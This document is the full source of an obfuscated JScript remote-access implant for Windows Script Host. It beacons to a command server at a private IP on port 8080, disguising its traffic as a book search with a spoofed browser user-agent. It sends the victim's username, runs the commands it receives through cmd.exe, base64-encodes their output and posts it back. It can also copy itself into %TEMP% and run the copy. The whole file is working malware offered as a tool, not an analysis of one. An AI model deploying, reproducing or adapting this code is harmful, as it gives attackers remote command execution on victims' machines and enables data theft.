//Define variables
var ho = "10.0."
var me = "2.4"
var p0rt= "8080"
var uri = "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
var proto = "ht"+"tp"+":/"+"/"
var home = proto+ho+me+":"+p0rt+uri
var sleepytime = 3000 //in milliseconds

var useragent = "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
var xFrameOptions = "SAMEORIGIN"
var contentEncoding = "gzip"
var contentType = "text/xml"

var x = "iveXOb"
eval("var runner = new Act"+x+"ject(\"WScr\" +   \"ipt.Sh\"+  \"ell\")")

var temp = runner.ExpandEnvironmentStrings("%TE" +"MP%");
var cs = runner.ExpandEnvironmentStrings("%C"+  "OmSP"    +"Ec%");
var un = runner.ExpandEnvironmentStrings("%US"+  "ER"+"NA"+  "ME%");

var curcmnd = '{"cmnd": ""}'
var retval = ""
var id = Math.floor(Math.random() * 99999999).toString()
var type = "js"

var selfpath = WScript.ScriptFullName
var fso = new ActiveXObject("Scripting.FileSystemObject")
if(fso.FileExists(selfpath))
{
  try
  {
    var fd = fso.OpenTextFile(selfpath)
	  var selfdata = fd.ReadAll();
	  fd.close()
  }
  catch (e) {};
}

//Helper functions
function post(home, response) {
  var res;
  try
  {
    var WinHttpReq = new ActiveXObject( "WinHttp.WinHttpRequest.5.1" );
    WinHttpReq.Open("POST", home, false);

    // Set HTTP Headers
    WinHttpReq.setRequestHeader("User-Agent", useragent);
    WinHttpReq.setRequestHeader("X-Frame-Options", xFrameOptions);
    WinHttpReq.setRequestHeader("Content-Type", contentType);

    //  Send the HTTP request.
    WinHttpReq.Send(response);
    // Wait for the entire response.
    WinHttpReq.WaitForResponse();
    //  Retrieve the response text.
    res = WinHttpReq.ResponseText;
  }
  catch (objError)
  {
    res = objError + "\n"
    res += "WinHTTP returned error: " +
        (objError.number & 0xFFFF).toString() + "\n\n";
    res += objError.description;
  }
  return res;
}

function streamStringToBinary(data) {
   var inputStream = WScript.CreateObject("ADODB.Stream");
   inputStream.Type = 2;
   inputStream.CharSet = "us-ascii";
   inputStream.Open();
   inputStream.WriteText(data);

   //Change stream to binary
   inputStream.Position = 0;
   inputStream.Type = 1;
   inputStream.Position = 0;

   var streamData = inputStream.Read();
   inputStream.Close();
   return streamData;
}

function b64(data) {
   var xml = WScript.CreateObject("MSXml2.DOMDocument");
   var element = xml.createElement("Base64Data");
   element.dataType = "bin.base64";
   element.nodeTypedValue = streamStringToBinary(data);
   return element.text.replace(/\n/g, "");
}

//Main
while(true)
{
  try
  {
    var checkin = '{"type": "'+type+'","id": '+id+',"un": "'+un+'"}';
    var serverMsg = post(home, checkin);
	  var jsondata = "{" + serverMsg.split("{")[1].split("\n")[0]

    if (curcmnd != jsondata) {
	    curcmnd = jsondata
      //Dangerous eval on unsanitized data here
      eval("jsObject="+jsondata);

	  //kill
	  if (jsObject.cmnd == "quit") {
		  WScript.Quit(1);
	  }

	  //spawn: writes js to %TEMP%
	  if (jsObject.cmnd == "spawn") {
		  fd = fso.CreateTextFile(temp+"\\"+id+".js")
		  fd.WriteLine(selfdata)
		  fd.close()
		  runner.Run(temp+"\\"+id+".js")
		  retval = "[+] Spawn success..."
	  }

	  //credit to nate and 0sum <3
	  else {
        runner.Run(cs +" /q /c " + jsObject.cmnd + " 1> " + temp + "\\__" + id + ".txt" + " 2>&1", 0, true)
		if(fso.FileExists(temp + "\\__" + id + ".txt")) {
		  fd = fso.OpenTextFile(temp + "\\__" + id + ".txt")
	      retval = fd.ReadAll()
		  fd.close()
		  fso.DeleteFile(temp + "\\__" + id + ".txt", true)
		}
		else {
		  retval = "[!] Error getting output"
		}
	  }
      var resp = '{"type": "'+type+'", "id": '+id+',"un":"'+un+'","retval":"'+b64(retval)+'"}';
      post(home, resp)
    }
  }
  catch (e) {
    WScript.Sleep(sleepytime);
  }
  WScript.Sleep(sleepytime);
}
